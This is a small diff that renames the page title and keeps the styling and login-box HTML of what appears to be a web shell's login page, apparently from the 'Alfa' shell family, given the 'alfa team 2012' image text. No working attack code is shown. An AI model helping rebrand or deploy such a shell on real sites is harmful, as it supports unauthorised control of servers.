@@ -526,7 +526,7 @@ body{background: black;}
 #loginbox { font-size:11px; color:green; right:85px; width:1200px; height:200px; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
 #loginbox td { border-radius:5px; font-size:11px; }
 </style>
-<title>.: 0x1337 :.</title><center>
+<title>Cybr0x</title><center>
 <center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://i.ibb.co/Gvb5Skmb/download.gif" /></center>
 <div id=loginbox><p><font face="verdana,arial" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
